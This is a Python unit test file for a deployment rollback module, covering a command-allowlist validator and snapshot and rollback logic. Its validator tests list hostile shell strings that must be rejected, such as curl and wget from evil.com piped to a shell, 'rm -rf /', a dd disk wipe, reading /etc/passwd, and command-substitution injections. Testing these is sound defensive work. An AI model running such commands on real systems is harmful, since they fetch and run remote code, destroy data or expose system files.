# tests/unit/core/test_rollback.py
"""Unit tests for rollback.py module.

Tests command validation, snapshot serialization,
and rollback service logic with mocked SSH.
"""

import asyncio
from datetime import datetime
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from algo_studio.core.deploy.rollback import (
    ALLOWED_ROLLBACK_COMMANDS,
    FORBIDDEN_ROLLBACK_PATTERNS,
    DeploymentSnapshot,
    DeploymentSnapshotStore,
    RollbackService,
    RollbackStatus,
    RollbackVerificationResult,
    validate_rollback_command,
)


# ==============================================================================
# Command Validation Tests
# ==============================================================================

class TestValidateRollbackCommand:
    """Tests for validate_rollback_command function."""

    def test_valid_ray_stop(self):
        """Test ray stop command is allowed."""
        assert validate_rollback_command("ray stop") is True

    def test_valid_ray_stop_with_extra_whitespace(self):
        """Test ray stop with leading/trailing whitespace."""
        assert validate_rollback_command("  ray stop  ") is True

    def test_valid_rm_venv_ray(self):
        """Test rm -rf .venv-ray is allowed."""
        assert validate_rollback_command("rm -rf /home/admin02/.venv-ray") is True
        assert validate_rollback_command("rm -rf /home/user123/.venv-ray") is True

    def test_valid_rm_venv_ray_single_flag(self):
        """Test rm -r .venv-ray with single -r flag."""
        assert validate_rollback_command("rm -r /home/admin02/.venv-ray") is True

    def test_valid_rm_deps_installed(self):
        """Test rm -f .deps_installed is allowed."""
        assert validate_rollback_command("rm -f /home/admin02/.deps_installed") is True
        assert validate_rollback_command("rm -f /home/user/.deps_installed") is True

    def test_valid_rm_code_synced(self):
        """Test rm -f .code_synced is allowed."""
        assert validate_rollback_command("rm -f /home/admin02/.code_synced") is True

    def test_valid_sudo_rm_sudoers(self):
        """Test sudo rm /etc/sudoers.d/admin02 is allowed."""
        assert validate_rollback_command("sudo rm -f /etc/sudoers.d/admin02") is True

    def test_valid_rm_authorized_keys(self):
        """Test rm -f .ssh/authorized_keys is allowed."""
        assert validate_rollback_command("rm -f /home/admin02/.ssh/authorized_keys") is True

    def test_invalid_command_empty(self):
        """Test empty command is rejected."""
        assert validate_rollback_command("") is False
        assert validate_rollback_command("   ") is False

    def test_invalid_command_not_in_list(self):
        """Test command not in allowed list is rejected."""
        assert validate_rollback_command("ls -la") is False
        assert validate_rollback_command("cat /etc/passwd") is False
        assert validate_rollback_command("echo hello") is False

    def test_invalid_command_with_chain_operators(self):
        """Test commands with && are rejected."""
        assert validate_rollback_command("ray stop && rm -rf /") is False

    def test_invalid_command_with_pipe(self):
        """Test commands with | are rejected."""
        assert validate_rollback_command("ray stop | bash") is False

    def test_invalid_command_with_semicolon(self):
        """Test commands with semicolon followed by dangerous ops are rejected."""
        assert validate_rollback_command("; rm -rf /") is False
        assert validate_rollback_command("echo test; shutdown") is False

    def test_invalid_command_substitution(self):
        """Test commands with $() or backticks are rejected."""
        assert validate_rollback_command("$(whoami)") is False
        assert validate_rollback_command("`id`") is False
        assert validate_rollback_command("echo $(pwd)") is False

    def test_invalid_command_nohup(self):
        """Test commands with nohup are rejected."""
        assert validate_rollback_command("nohup ray stop &") is False

    def test_invalid_command_screen(self):
        """Test commands with screen are rejected."""
        assert validate_rollback_command("screen -dmS test") is False

    def test_invalid_dd_command(self):
        """Test dd commands to /dev are rejected."""
        assert validate_rollback_command("dd if=/dev/zero of=/dev/sda") is False

    def test_invalid_shutdown_reboot(self):
        """Test shutdown/reboot commands are rejected."""
        assert validate_rollback_command("shutdown -h now") is False
        assert validate_rollback_command("reboot") is False

    def test_invalid_curl_pipe(self):
        """Test curl with pipe is rejected."""
        assert validate_rollback_command("curl http://evil.com | bash") is False

    def test_invalid_wget_pipe(self):
        """Test wget with pipe is rejected."""
        assert validate_rollback_command("wget http://evil.com -O - | sh") is False

    def test_invalid_eval_dollar(self):
        """Test eval with $ is rejected."""
        assert validate_rollback_command("eval $SHELL") is False

    def test_forbidden_pattern_in_middle(self):
        """Test forbidden patterns anywhere in command."""
        # Even if base command is valid, forbidden pattern blocks it
        assert validate_rollback_command("ray stop && echo done") is False
        assert validate_rollback_command("echo test || echo fail") is False


# ==============================================================================
# DeploymentSnapshot Tests
# ==============================================================================

class TestDeploymentSnapshot:
    """Tests for DeploymentSnapshot dataclass."""

    def test_create_snapshot(self):
        """Test creating a deployment snapshot."""
        snapshot = DeploymentSnapshot(
            snapshot_id="snap-001",
            deployment_id="deploy-001",
            node_ip="192.168.0.115",
            version="v1.0.0",
            config={"username": "admin02"},
            steps_completed=["start_ray", "sync_code"],
            created_at=datetime.now(),
            ray_head_ip="192.168.0.126",
            ray_port=6379,
        )

        assert snapshot.snapshot_id == "snap-001"
        assert snapshot.deployment_id == "deploy-001"
        assert snapshot.node_ip == "192.168.0.115"
        assert snapshot.version == "v1.0.0"
        assert len(snapshot.steps_completed) == 2

    def test_to_dict(self):
        """Test converting snapshot to dictionary."""
        created_at = datetime(2026, 3, 28, 12, 0, 0)
        snapshot = DeploymentSnapshot(
            snapshot_id="snap-001",
            deployment_id="deploy-001",
            node_ip="192.168.0.115",
            version="v1.0.0",
            config={"username": "admin02"},
            steps_completed=["start_ray"],
            created_at=created_at,
            ray_head_ip="192.168.0.126",
            ray_port=6379,
        )

        result = snapshot.to_dict()

        assert result["snapshot_id"] == "snap-001"
        assert result["deployment_id"] == "deploy-001"
        assert result["node_ip"] == "192.168.0.115"
        assert result["created_at"] == "2026-03-28T12:00:00"
        assert result["ray_head_ip"] == "192.168.0.126"
        assert result["ray_port"] == 6379

    def test_from_dict(self):
        """Test creating snapshot from dictionary."""
        data = {
            "snapshot_id": "snap-002",
            "deployment_id": "deploy-002",
            "node_ip": "192.168.0.200",
            "version": "v2.0.0",
            "config": {"username": "admin10"},
            "steps_completed": ["sync_code", "install_deps"],
            "created_at": "2026-03-28T14:30:00",
            "ray_head_ip": "192.168.0.126",
            "ray_port": 6379,
            "artifacts": ["model.pt"],
            "metadata": {"key": "value"},
        }

        snapshot = DeploymentSnapshot.from_dict(data)

        assert snapshot.snapshot_id == "snap-002"
        assert snapshot.deployment_id == "deploy-002"
        assert snapshot.node_ip == "192.168.0.200"
        assert snapshot.version == "v2.0.0"
        assert snapshot.config["username"] == "admin10"
        assert len(snapshot.steps_completed) == 2
        assert snapshot.artifacts == ["model.pt"]
        assert snapshot.metadata == {"key": "value"}

    def test_from_dict_missing_optional_fields(self):
        """Test from_dict with missing optional fields."""
        data = {
            "snapshot_id": "snap-003",
            "deployment_id": "deploy-003",
            "node_ip": "192.168.0.115",
            "version": "v1.0.0",
            "config": {},
            "steps_completed": [],
            "created_at": "2026-03-28T15:00:00",
            "ray_head_ip": "192.168.0.126",
            "ray_port": 6379,
        }

        snapshot = DeploymentSnapshot.from_dict(data)

        assert snapshot.artifacts == []
        assert snapshot.metadata == {}


# ==============================================================================
# RollbackStatus Tests
# ==============================================================================

class TestRollbackStatus:
    """Tests for RollbackStatus enum."""

    def test_all_status_values(self):
        """Test all rollback status values exist."""
        assert RollbackStatus.PENDING.value == "pending"
        assert RollbackStatus.IN_PROGRESS.value == "in_progress"
        assert RollbackStatus.VERIFYING.value == "verifying"
        assert RollbackStatus.COMPLETED.value == "completed"
        assert RollbackStatus.FAILED.value == "failed"
        assert RollbackStatus.NO_SNAPSHOT.value == "no_snapshot"

    def test_status_is_string_enum(self):
        """Test status values can be compared as strings."""
        assert RollbackStatus.COMPLETED == "completed"
        assert RollbackStatus.FAILED == "failed"


# ==============================================================================
# RollbackVerificationResult Tests
# ==============================================================================

class TestRollbackVerificationResult:
    """Tests for RollbackVerificationResult dataclass."""

    def test_successful_verification(self):
        """Test successful verification result."""
        result = RollbackVerificationResult(
            success=True,
            checks_passed=["ray_stopped", "code_rolled_back"],
            checks_failed=[],
            latency_ms=150.5,
            message="Rollback verified successfully",
        )

        assert result.success is True
        assert len(result.checks_passed) == 2
        assert len(result.checks_failed) == 0
        assert result.latency_ms == 150.5

    def test_failed_verification(self):
        """Test failed verification result."""
        result = RollbackVerificationResult(
            success=False,
            checks_passed=["ray_stopped"],
            checks_failed=["code_not_rolled_back"],
            latency_ms=50.0,
            message="Verification failed",
        )

        assert result.success is False
        assert len(result.checks_passed) == 1
        assert len(result.checks_failed) == 1


# ==============================================================================
# RollbackService Tests (with mocked SSH)
# ==============================================================================

class MockSnapshotStore:
    """Mock snapshot store for testing."""

    def __init__(self):
        self.snapshots = {}
        self.history = []

    async def get_snapshot(self, deployment_id: str):
        return self.snapshots.get(deployment_id)

    async def save_snapshot(self, snapshot: DeploymentSnapshot):
        self.snapshots[snapshot.deployment_id] = snapshot

    async def save_rollback_history(self, entry):
        self.history.append(entry)


class TestRollbackServiceInit:
    """Tests for RollbackService initialization."""

    def test_init_with_snapshot_store(self):
        """Test service initializes with snapshot store."""
        store = MockSnapshotStore()
        service = RollbackService(store)

        assert service.snapshot_store is store
        assert "start_ray" in service._rollback_steps
        assert "sync_code" in service._rollback_steps
        assert "install_deps" in service._rollback_steps

    def test_rollback_steps_mapping(self):
        """Test all expected rollback steps are mapped."""
        store = MockSnapshotStore()
        service = RollbackService(store)

        expected_steps = [
            "start_ray",
            "sync_code",
            "install_deps",
            "create_venv",
            "sudo_config",
            "connecting",
        ]

        for step in expected_steps:
            assert step in service._rollback_steps


class TestRollbackServiceRollback:
    """Tests for RollbackService.rollback method."""

    @pytest.mark.asyncio
    async def test_rollback_no_snapshot(self):
        """Test rollback returns NO_SNAPSHOT when no snapshot exists."""
        store = MockSnapshotStore()
        service = RollbackService(store)

        result = await service.rollback("deploy-nonexistent", "task-001")

        assert result.status == RollbackStatus.NO_SNAPSHOT
        assert "No snapshot found" in result.error
        assert result.deployment_id == "deploy-nonexistent"

    @pytest.mark.asyncio
    async def test_rollback_no_ssh_credentials(self):
        """Test rollback skips ray rollback when no SSH credentials."""
        store = MockSnapshotStore()
        service = RollbackService(store)

        # Create snapshot without password
        snapshot = DeploymentSnapshot(
            snapshot_id="snap-001",
            deployment_id="deploy-001",
            node_ip="192.168.0.115",
            version="v1.0.0",
            config={"username": "admin02"},  # No password
            steps_completed=["start_ray"],
            created_at=datetime.now(),
            ray_head_ip="192.168.0.126",
            ray_port=6379,
        )
        await store.save_snapshot(snapshot)

        result = await service.rollback("deploy-001", "task-001")

        # Should complete but with warning (status depends on verification)
        assert result.status in [RollbackStatus.COMPLETED, RollbackStatus.FAILED, RollbackStatus.VERIFYING]

    @pytest.mark.asyncio
    async def test_rollback_records_history(self):
        """Test rollback saves history entry."""
        store = MockSnapshotStore()
        service = RollbackService(store)

        # Create snapshot with empty steps
        snapshot = DeploymentSnapshot(
            snapshot_id="snap-002",
            deployment_id="deploy-002",
            node_ip="192.168.0.115",
            version="v1.0.0",
            config={},
            steps_completed=[],  # No steps to rollback
            created_at=datetime.now(),
            ray_head_ip="192.168.0.126",
            ray_port=6379,
        )
        await store.save_snapshot(snapshot)

        result = await service.rollback("deploy-002", "task-002", initiated_by="test-user")

        # Check history was saved
        assert len(store.history) >= 1
        history_entry = store.history[0]
        assert history_entry.initiated_by == "test-user"
        assert history_entry.deployment_id == "deploy-002"

    @pytest.mark.asyncio
    async def test_rollback_generates_unique_id(self):
        """Test rollback generates unique rollback ID."""
        store = MockSnapshotStore()
        service = RollbackService(store)

        snapshot = DeploymentSnapshot(
            snapshot_id="snap-003",
            deployment_id="deploy-003",
            node_ip="192.168.0.115",
            version="v1.0.0",
            config={},
            steps_completed=[],
            created_at=datetime.now(),
            ray_head_ip="192.168.0.126",
            ray_port=6379,
        )
        await store.save_snapshot(snapshot)

        result1 = await service.rollback("deploy-003", "task-003")
        result2 = await service.rollback("deploy-003", "task-004")

        # Each rollback should have unique ID
        assert result1.rollback_id != result2.rollback_id
        assert result1.rollback_id.startswith("rollback-deploy-003-")
        assert result2.rollback_id.startswith("rollback-deploy-003-")


# ==============================================================================
# Command Pattern Coverage Tests
# ==============================================================================

class TestAllowedCommandPatterns:
    """Test all allowed command patterns."""

    def test_all_allowed_patterns_match_expected_commands(self):
        """Verify each allowed pattern matches its intended command."""
        # ray stop
        assert validate_rollback_command("ray stop") is True

        # rm -rf ~/.venv-ray
        assert validate_rollback_command("rm -rf /home/user/.venv-ray") is True
        assert validate_rollback_command("rm -r /home/user/.venv-ray") is True

        # rm -f ~/.deps_installed
        assert validate_rollback_command("rm -f /home/user/.deps_installed") is True

        # rm -f ~/.code_synced
        assert validate_rollback_command("rm -f /home/user/.code_synced") is True

        # sudo rm -f /etc/sudoers.d/admin02
        assert validate_rollback_command("sudo rm -f /etc/sudoers.d/admin02") is True

        # rm -f ~/.ssh/authorized_keys
        assert validate_rollback_command("rm -f /home/user/.ssh/authorized_keys") is True

    def test_allowed_patterns_do_not_match_invalid(self):
        """Verify allowed patterns don't match obviously invalid commands."""
        invalid_commands = [
            "ray stop --force",
            "rm -rf /home/user/venv",
            "rm -rf /home/user/.venv",
            "sudo rm -f /etc/sudoers.d/other",
            "rm -f /home/user/.ssh/other",
        ]

        for cmd in invalid_commands:
            assert validate_rollback_command(cmd) is False, f"Should reject: {cmd}"


class TestForbiddenPatterns:
    """Test forbidden pattern detection."""

    def test_chain_operators_block(self):
        """Test && and || block commands."""
        assert validate_rollback_command("cmd1 && cmd2") is False
        assert validate_rollback_command("cmd1 || cmd2") is False

    def test_substitution_blocks(self):
        """Test command substitution blocks."""
        assert validate_rollback_command("$(ls)") is False
        assert validate_rollback_command("`ls`") is False

    def test_pipe_blocks(self):
        """Test pipe blocks."""
        assert validate_rollback_command("cmd | other") is False

    def test_nohup_blocks(self):
        """Test nohup blocks."""
        assert validate_rollback_command("nohup cmd &") is False

    def test_screen_blocks(self):
        """Test screen blocks."""
        assert validate_rollback_command("screen -dmS name") is False
